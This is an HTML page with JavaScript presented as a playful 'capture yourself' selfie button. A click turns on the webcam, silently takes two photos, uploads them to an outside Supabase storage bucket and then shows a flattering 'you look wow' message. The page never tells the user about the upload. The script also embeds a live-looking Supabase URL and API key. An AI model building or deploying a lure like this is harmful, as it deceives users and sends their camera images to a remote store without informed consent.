<!DOCTYPE html>
<html>
<head>
    <style>
        /* CSS for the clickable image */
        #captureButton {
            cursor: pointer;
            border: 5px solid transparent; 
            transition: border-color 0.2s;
            max-width: 100%; 
            height: auto; 
            display: block; 
            margin-bottom: 5px; /* Reduced margin to bring text closer */
        }
        #captureButton:hover {
            border-color: #007bff; 
        }

        /* ‚≠ê NEW CSS for the Vintage Text */
        #vintageText {
            font-family: 'Times New Roman', serif; /* Classic, serif font */
            font-size: 24px;
            font-weight: bold;
            color: #333; /* Dark gray color */
            text-align: center;
            text-transform: uppercase; /* Capitalize for a strong, vintage look */
            letter-spacing: 2px; /* Add some space between letters */
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2); /* Subtle shadow for depth */
            margin-top: 10px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

<img id="captureButton"
     src="https://i.pinimg.com/1200x/21/0d/8e/210d8e9460ebac31129b21b429cba869.jpg" 
     alt="Click to View" 
     title="Click to start camera capture">

<div id="vintageText">CLICK LENS TO CAPTURE YOURSELF</div>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" width="300" height="225" style="display:none;"></canvas>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<script>
// ---------------------------------------
// üö® REPLACE THESE WITH YOUR VALUES
// ---------------------------------------
const SUPABASE_URL = "https://uepkmdqhutljgjlktzaq.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVlcGttZHFodXRsamdqbGt0emFxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjUyNjIxNjIsImV4cCI6MjA4MDgzODE2Mn0.kssAOFujyXLkH_z2g_bDJ-ws8UOVCFuumUQ5S4W0WS8";
// ---------------------------------------

// Supabase client
const db = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// When user clicks the image (which now has the ID "captureButton")
document.getElementById("captureButton").addEventListener("click", async () => {
    try {
        // Optional: Disable clicking the button/image while the camera is active
        document.getElementById("captureButton").style.pointerEvents = 'none';
        
        console.log("Requesting camera...");
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });

        const video = document.getElementById("video");
        video.srcObject = stream;

        // Wait until video is ready
        video.onloadedmetadata = () => {
            console.log("Camera started.");
            captureAndUpload(stream, 2);
        };

    } catch (err) {
        alert("Camera permission denied: " + err);
        console.error(err);
        document.getElementById("captureButton").style.pointerEvents = 'auto'; // Re-enable on error
    }
});

// Capture 2 images and upload
async function captureAndUpload(stream, total) {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    for (let i = 0; i < total; i++) {

        console.log(`Capturing image ${i + 1}`);

        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));

        const fileName = `photo_${Date.now()}_${i}.png`;

        console.log("Uploading:", fileName);

        const { data, error } = await db.storage
            .from("camera-uploads")
            .upload(fileName, blob);

        if (error) {
            console.error("Upload failed:", error);
            alert("Upload error: " + error.message);
            stream.getTracks().forEach(t => t.stop());
            document.getElementById("captureButton").style.pointerEvents = 'auto'; // Re-enable on upload error
            return;
        }

        console.log("Uploaded:", data);
        await new Promise(res => setTimeout(res, 500));
    }

    // Stop camera
    stream.getTracks().forEach(t => t.stop());
    alert("APPRECIATE YOUR BEAUTY, YOU LOOK WOW...");
    document.getElementById("captureButton").style.pointerEvents = 'auto'; // Re-enable after successful completion
}

</script>

</body>
</html>
